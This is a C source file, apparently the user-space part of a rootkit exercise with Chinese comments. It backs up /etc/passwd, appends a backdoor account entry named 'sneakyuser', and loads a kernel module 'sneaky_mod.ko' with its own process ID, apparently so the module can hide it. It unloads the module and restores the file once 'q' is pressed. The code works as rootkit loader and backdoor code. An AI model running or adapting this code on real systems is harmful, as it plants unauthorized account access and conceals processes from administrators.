#include <stdio.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


void mycopy(){
    const char *fileRead = "/etc/passwd";
    const char *fileWrite = "/tmp/passwd";

    //首先打开一个文件
    int file=open(fileRead,O_RDWR|O_CREAT);
    
    if(file==-1){//校验是否成功的打开了文件
        perror("read");//打开失败输出信息
        exit(1);//失败退出当前的程序
    } 
    //创建一个写入的文件
    int new_file=open(fileWrite,O_RDWR|O_CREAT);//设置权限为777的love的txt文件
    
    if(new_file==-1){//校验是否成功的创建了该文件 
        perror("write");//打开失败输出信息
        exit(1);//失败退出当前的程序
    } 
    //创建一个缓冲，初始化为一
    int buff[1024]={0};
    int count=0;//初始化计数器
    count=read(file,buff,1024);//将读到的字节数组保存到缓冲数组中
    if(count==-1){
        perror("read");//文件中没有数据
        exit(1);//退出程序
    }
    
    while(count){//当输出为0时读取完毕
        write(new_file,buff,count);//将读取到的字节写入到文件中
        count=read(file,buff,count);//继续进行读取
    }
    close(file);//关闭文件
    close(new_file);//关闭文件

}

void myprint_tmp(){
    char c;
    //const char *F_PATH = "/etc/passwd";
    const char *F_PATH = "/tmp/passwd";

    FILE*fp=NULL;//需要注意
    fp=fopen(F_PATH,"r");
    if(NULL==fp){printf("error");return;}//要返回错误代码
    while(fscanf(fp,"%c",&c)!=EOF) printf("%c",c); //从文本中读入并在控制台打印出来
    fclose(fp);
    fp=NULL;//需要指向空，否则会指向原打开文件地址    
    printf("=================tmp printf over==================\n");
    return;
}

void myprint_etc(){
    char c;
    const char *F_PATH = "/etc/passwd";
    //const char *F_PATH = "/tmp/passwd";

    FILE*fp=NULL;//需要注意
    fp=fopen(F_PATH,"r");
    if(NULL==fp){printf("error");return;}//要返回错误代码
    while(fscanf(fp,"%c",&c)!=EOF) printf("%c",c); //从文本中读入并在控制台打印出来
    fclose(fp);
    fp=NULL;//需要指向空，否则会指向原打开文件地址    
    printf("=================etc printf over==================\n");
    return;
}

void myinsert(){
    char c;
    const char *F_PATH = "/etc/passwd";
    FILE*fp;
    fp = fopen(F_PATH,"a");

    char *str = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
    fputs(str,fp);
    fclose(fp);
}

void myrestore(){
    const char *fileRead = "/tmp/passwd";
    const char *fileWrite = "/etc/passwd";

    //首先打开一个文件
    FILE* file=fopen(fileRead,"r");

    //创建一个写入的文件
    FILE* new_file=fopen(fileWrite,"w+");//
    
    //创建一个缓冲，初始化为一
    int buf[1024]={0};
    int nread;
    
    while(nread = fread(buf,sizeof(char),1024,file)){//当输出为0时读取完毕
        fwrite(buf,sizeof(char),nread,new_file);
    }
    fclose(file);//关闭文件
    fclose(new_file);//关闭文件
}

void install_module(){
    char str[100];
    sprintf(str, "insmod sneaky_mod.ko mystring=%d", (int)getpid());
    system(str);
}
 
void qloop(){
    while(1){
        char c = getchar();
        if(c == 'q'){
            break;
        }
    }
}

void remove_module(){
    system("rmmod sneaky_mod");
}
int main(){
    //printf("hello world\n");
    
    int pid = getpid();
    printf("sneaky_process pid = %d\n",pid);
    
 
    mycopy();
    //myprint_tmp();
    myinsert();
    //myprint_etc();

    install_module();
    qloop();
    remove_module();

    //myprint_tmp();
    myrestore();
    //myprint_etc();
	return 0;
}